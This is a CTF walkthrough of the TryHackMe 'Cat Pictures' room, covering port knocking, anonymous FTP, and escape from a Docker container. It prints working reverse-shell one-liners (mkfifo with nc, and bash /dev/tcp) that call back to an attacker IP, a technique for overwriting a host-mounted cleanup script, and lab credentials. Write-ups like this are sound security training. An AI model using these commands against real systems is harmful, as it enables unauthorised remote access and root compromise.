---
title: Cat Pictures
date: 2021-09-07 12:00:00
categories: [CTF, TryHackMe]
tags: [docker,port-knocking]     # TAG names should always be lowercase
---
![](https://tryhackme-images.s3.amazonaws.com/room-icons/0d75a543c66201b4aa996172b6043eb5.jpeg)
Link to room: [Cat Pictures](https://tryhackme.com/room/catpictures) 

## Enumeration

Our initial run of `nmap` gives us a small attack surface:

```bash
┌──(user㉿kali-linux-2022-2)-[~]
└─$ nmap -sC -sV 10.10.94.199
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 20:08 EDT
Nmap scan report for 10.10.94.199
Host is up (0.087s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
|   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
|_  256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
8080/tcp open  http    Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
|_http-title: Cat Pictures - Index page
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.89 seconds
```

## Port Knocking

Visiting the site on `8080` we find a phpBB instance with one message containing a not-so-subtle hint that we’ll need to use port-knocking. 

![Screenshot 2023-08-06 at 8.18.16 PM.png](/assets/cat-pictures/php.png)

We `apt install knockd` to get the `knock` client and call it with the “magic numbers” provided:

`knock 10.10.94.199 1111 2222 3333 4444`

## Initial Access

Running `nmap` again after knocknig we find an ftp site that allows anonymous login:

```
└─$ nmap -sC -sV 10.10.94.199                                                                           
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 20:18 EDT
Nmap scan report for 10.10.94.199
Host is up (0.087s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.1.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           162 Apr 02  2021 note.txt
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
|   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
|_  256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
8080/tcp open  http    Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Cat Pictures - Index page
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Logging in to the ftp site as anonymous yields one file, `note.txt` with a clue about how to move forward. 

```bash
┌──(user㉿kali-linux-2022-2)-[~]
└─$ cat note.txt
In case I forget my password, I'm leaving a pointer to the internal shell service on the server.

Connect to port 4420, the password is sardinethecat.
- catlover
```

If we try to `ssh` to port 4420 it won’t connect, so we’ll use netcat to make a plain TCP connection. With the credentials supplied above we land in a heavily restricted shell.

```
┌──(user㉿kali-linux-2022-2)-[~]
└─$ nc 10.10.94.199 4420
INTERNAL SHELL SERVICE
please note: cd commands do not work at the moment, the developers are fixing it at the moment.
do not use ctrl-c
Please enter password:
runme
THIS EXECUTABLE DOES NOT WORK UNDER THE INTERNAL SHELL, YOU NEED A REGULAR SHELL.

cat runme
THIS EXECUTABLE DOES NOT WORK UNDER THE INTERNAL SHELL, YOU NEED A REGULAR SHELL.
Password accepted

```

## Escalation #1

Enumerating a bit we find there is almost nothing to look at, except for one file `runme` in our catlover’s directory. We have permissions to files in this directory so we assume that our account is catlover. 

```
ls -la /home/catlover
total 28
drwxr-xr-x 2 0 0  4096 Apr  3  2021 .
drwxr-xr-x 3 0 0  4096 Apr  2  2021 ..
-rwxr-xr-x 1 0 0 18856 Apr  3  2021 runme
```

We can’t run or even examine this file with our current shell……..

```
runme
THIS EXECUTABLE DOES NOT WORK UNDER THE INTERNAL SHELL, YOU NEED A REGULAR SHELL.

cat runme
THIS EXECUTABLE DOES NOT WORK UNDER THE INTERNAL SHELL, YOU NEED A REGULAR SHELL.
```

so it’s time to upgrade by starting a new listener and call it with  `rm -f /tmp/b; mkfifo /tmp/b; /bin/sh -i 2>&1 0</tmp/b | nc 10.6.1.1 4445 1>/tmp/b`

Back in our new shell we return to examine `runme`. The `strings` command isn’t available in our shell. We could download the file and inspect it locally but it’s not too large so we’ll just use `cat` to see what we can see.  `cat runme`

![runme](/assets/cat-pictures/Screenshot.png)


Scanning a bit we quickly find the string table near the beginning of the binary, and one string in particular that looks like a password.

Executing `runme` with the proper password drops an ssh key in home folder.

```bash
# ./runme
Please enter yout password: [redacted]
Welcome, catlover! SSH key transfer queued!
```

We can download this key to our attacker machine or just copy and paste it into a new file. We’ll need to change permissions on the key before we use it: 

`chmod 600 id_rsa`

And we can SSH into the box with `ssh -i id_rsa [catlover@10.10.94.199](mailto:catlover@10.10.94.199)`

## Escalation #2

We find ourselves in a Docker container. We’ve achieved root access, but only retrieved the first flag. Clearly the second flag is on the Docker host machine. 

🐰 **Rabbit Hole:** Enumerate MariaDB

We find database credentials for MariaDB in the phpBB configuration file. We should enumerate while we’re here. 

`mysql --host mariadb --user=bn_phpbb --password bitnami_phpbb`

Searching through the DB we find the schema for the forum and a test schema. We inspect tables for users, posts, private messages ans drafts but find nothing of value. The database engine is running on a different IP than we are, so we run `system` commands to examine that environment, but this does not lead us out of Docker. 

### Escape the Docker Container

We have a script `clean.sh` in `/opt/clean` . Using `mount` we determine that this folder is mounted from the host OS.

```
(remote) root@7546fa2336d6:/opt/clean# mount
[...]
/dev/xvda1 on /bitnami/phpbb type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/xvda1 on /opt/clean type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/xvda1 on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/xvda1 on /etc/hostname type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/xvda1 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro,data=ordered)
[...]
(remote) root@7546fa2336d6:/opt/clean#
```

#### 🐰 Rabbit Hole: Two Shells scenario

We have a shell inside and outside of the container, and there are some exploits in this scenario [as documented on HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells-and-host-mount). Unfortunately our host shell does not have access to the shared mount point to execute scenario #1, and we can’t run `ps` to execute scenario #2.  

Turning our attention back to `clean.sh` we note that it simply empties the `/tmp` directory. 

```bash
#!/bin/bash

rm -rf /tmp/*
```

Adding a file to our local `/tmp` directory and waiting just a few minutes (this is a CTF after all…) we see that the `clean.sh` script isn’t executing against our filesystem in the container. If it’s being called on the host side, this would be a path to escape the container. 

Let’s try sticking a reverse shell in there just in case:

`echo "bash -i >& /dev/tcp/10.6.1.1/4446 0>&1" > clean.sh`

Waiting another minute or two rewards us with a shell triggered by root on the docker host. We find our second flag at `/root` as usual. 

Thanks go out to [gamercat](https://tryhackme.com/p/gamercat) for a fun box!